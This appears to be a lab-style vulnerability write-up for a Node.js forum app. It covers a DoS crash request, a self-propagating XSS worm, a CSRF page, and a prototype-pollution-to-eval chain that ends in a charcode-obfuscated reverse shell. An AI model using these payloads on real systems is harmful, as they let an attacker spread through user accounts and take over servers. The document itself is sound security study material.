# DoS vulnerabilities
    
```javascript
fetch('/upload', { 
    method: 'POST', 
    headers: { 
        ['content-type']: 'multipart/form-data;boundary=----WebKitFormBoundaryoo6vortfDzBsDiro', ['content-length']: '145', host: '127.0.0.1:3000', connection: 'keep-alive', }, body: '------WebKitFormBoundaryoo6vortfDzBsDiro\r\n Content-Disposition: form-data; name="bildbeschreibung"\r\n\r\n\r\n------WebKitFormBoundaryoo6vortfDzBsDiro--' });
```
This request crashes the web server due to [CVE-2022-24434](https://www.cve.org/CVERecord?id=CVE-2022-24434)

We can mitigate this bug by using a different parser.

With this fix implemented, the server does not crash anymore. It instead returns a 500 error, which is not ideal, but better than crashing the server. Really, this webste crashes all the time, so finding a bug this sophisticated is not necessary. 


# XSS

The website uses a CSP (Content Security Policy) which allows the browser to load scripts only from certain sources. 
In theory, this can help prevent XSS attacks. However, even though the CSP is configured in a way that makes it impossible to load scripts from external sources, or even inline in the html, we can still execute code.
By uploading a javascript file as our profile picture, we can create a resource on the website that can be loaded by the browser.

In order to actually run the code then, we need to create a script tag that loads our script from the server. This can be done by creating a post with the following content:

```html
<scr<scriptipt src="http://localhost:3000/images/profileImages/username"></script>
```

This is the payload we uploaded as our profile picture:

```javascript
const {protocol, hostname, port} = window.location

const username = "username"

const postUrl = protocol + "//" + hostname + ":" + port + "/createThread?topic=discussion" 
const changeProfilePictureUrl = protocol + "//" + hostname + ":" + port + "/upload"
const payloadUrl = protocol + "//" + hostname + ":" + port + `/images/profileImages/${username}`

async function propagate(){
    const thisFile = await fetch(payloadUrl);
    const thisFileText = await thisFile.text();
    const myUsername = document.querySelector(".dropdown-toggle").getAttribute("title");
    if(myUsername == username || myUsername == null){
        return;
    }
    const usernameRegex = /(const username = )"([\w\d])"/
    const newPayload = thisFileText.replace(usernameRegex, `$1"${myUsername}"`)
    const formData = new FormData();
    formData.append("avatar", new Blob([newPayload], {type: "text/javascript"}), "payload.js");
    const response = await fetch(changeProfilePictureUrl, {
        method: "POST",
        body: formData
    })

    const newProfilePictureUrl = protocol + "//" + hostname + ":" + port + `/images/profileImages/${myUsername}`

    const xssPayload = `I got some new kicks at the kicks store. Don't know how to post images on here sorry! <scr<scriptipt src="${newProfilePictureUrl}"></script>`

    const createThreadData = `subject=New+kicks&body=${encodeURIComponent(xssPayload)}`

    const postResponse = await fetch(postUrl, {
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST",
        body: createThreadData
    })

}

propagate();
```

This payload will change the username in the payload to the username of the user that visits the page. It will then upload the payload as the user's profile picture, and create a post with a script tag that loads the user's profile picture. This will then execute the payload on the user's browser, which will then execute the payload on every user's browser that visits the page.

# CSRF

The website does not have any CSRF protection for its forms. We can easily create a thread on a user's behalf by having them press a button on a website we control.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Epic form website!</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div id="container">
        <h1 id="title">Epic website with a cool button!</h1>
        <!--A form with only hidden fields and a submit button-->
        <form action="http://localhost:3000/createThread?topic=discussion" method="post">
            <!--The hidden fields-->
            <input type="hidden" name="subject" value="You won't believe what happened to me!!!! MUST READ!!!">
            <input type="hidden" name="body" value="I won a free milkshake at McDonald's!!! <scr<scriptipt src='http://localhost:3000/images/profileImages/username'></script>">
            <!--The submit button-->
            <input id="submit_button" type="submit" value="Learn more!">
        </form>
    </div>
</body>
</html>
```

This payload will create a post on the victim's behalf that will execute the payload we uploaded as our profile picture. This can make it look as if the victim is the one posting malicious content, although we still had to upload the profile picture ourselves. We could also have made another user post the payload with another csrf attack.

To mitigate this issue, the web app should use CSRF tokens for its forms.


# Prototype pollution & RCE


## Stage 1: Prototype pollution
In the file `user.js`, a POST route defined at `/upload/users` allows the user to upload a JSON file containing an array of users. This is likely functionality that was added for testing purposes or for administrator use. The route expects an array of user objects, where each user is either new or already exists in the database. If the user already exists, it will be merged with the existing record from the database. This is done in an unsecure way that allows for prototype pollution. This is the function that merges the user objects:

```javascript
function merge(target, source) {
  Object.keys(source).forEach(key => {
    if (isObject(source[key])) {
      if (!target[key]) {
        target[key] = {};
      }
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  });

  return target;
}
```

By first uploading an empty user object, we can then upload a user object with a prototype property that will be merged with the empty user object. This will allow us to set arbitrary properties on the empty user object. This is the payload we will upload:

```javascript
[{
    "lcUsername": "testuser", 
    "__proto__": {
        "constructor": {
            "prototype": {"userAutoCreateTemplate": true}
        }
    }
}]
```

`userAutoCreateTemplate` is a property that is used to determine whether or not a user should be created if they do not exist in the database. By setting this property to true, we can create a user with any username we want. This is interesting because the code that is used to create a user contains a vulnerable eval statement without any sanitization. This is the code that is used to create a user:

```javascript
if (options.userAutoCreateTemplate) {
          try {
            const wrapperFunction = `(function() {
              const username = '${username}'; // <-- This is the username we can control
              const passport = '${password}';
              return \`${options.userAutoCreateTemplate}\`;
            })()`
            const newUser = JSON.parse(eval(wrapperFunction))
            // Insert the new username into the database
            mongo.db.collection('users')
              .insertOne(newUser, (err, result) => {
                if (err) {return done(err)} else {
                mongo.db.collection("users").findOne(result.insertedId, (err, result) => {
                  if (err) {return done(err)} else {
                    return done(null, result)
                  }
                })
              }
            });
          } catch (error) {
            console.log(error)
          }
        }
```

Clearly, the only thing we need to do with our username in order to gain the ability to run any code we want on the server is something like this: `username'; console.log('hello world'); //`.

With this said, here is a function that can be run in the browser console to gain a shell on the server:

```javascript
// The parameter i is a debug parameter that is used to make sure we create a new user every time we run the function. 
async function injectPayload(i){
    async function upload(payload){
        const file = new File([payload], "users.json", {type: "application/json"});
        const data = new FormData();
        data.append("upload-users", file);
        const res = await fetch("/upload/users", {
            method: "POST",
            headers: {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    
            },
            body: data
        })
    }
    // Create a user in the database
    const payload1 = 
    `[{
        "lcUsername": "testuser${i}"
    }]`
    
    await upload(payload1).catch(e => console.log(e))
    
    // Update said user in order to execute prototype pollution
    
    const payload2 = 
    `[{
        "lcUsername": "testuser${i}", 
        "__proto__": {
            "constructor": {
                "prototype": {"userAutoCreateTemplate": true}
            }
        }
    }]`
    
    await upload(payload2).catch(e => console.log(e))
    // Reverse shell generated from python script
    const revshell = "eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,56,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,34,108,105,115,116,101,110,105,110,103,32,111,110,32,112,111,114,116,32,34,32,43,32,80,79,82,84,32,43,32,34,92,110,34,41,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,40,41,32,61,62,32,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))"

    const payload3 = new FormData();
    // The code that will be executed on the server
    payload3.append("username", `blabla';
                    console.log("im in");
                    delete Object.prototype.userAutoCreateTemplate;
                    ${revshell};
                    return "{}";//`); // Escape the string to avoid syntax errors
    payload3.append("password", "blabla");

    await fetch("/login", {
        method: "POST",
        body: new URLSearchParams(payload3)
        }).catch((err) => console.log(err));

}
```
Toward the end of the final payload, we can see `delete Object.prototype.userAutoCreateTemplate;`, which was added in order to prevent a crash. MongoDB apparently does not like prototype pollution.